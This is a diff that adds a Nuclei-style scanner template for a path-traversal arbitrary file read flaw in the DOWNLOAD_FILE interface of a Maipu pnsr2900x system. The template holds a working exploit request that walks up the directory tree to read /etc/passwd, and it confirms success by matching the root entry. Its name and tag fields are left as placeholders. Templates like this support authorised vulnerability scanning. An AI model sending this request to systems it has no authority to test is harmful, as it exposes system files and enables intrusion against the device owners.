@@ -1,0 +1,20 @@
+id: MAiPU-DOWNLOAD-lfi
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 迈普pnsr2900x系统接口DOWNLOAD_FILE任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。
+  reference:
+    - https://github.com/wy876/POC/commit/c8a82a7fb109abf4a49887d5b891ce93b689dff9#diff-2d969910d50f064a3356f05c6d6b3df31488621e2f902637fc46c931a5658e41R3
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../../etc/passwd"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
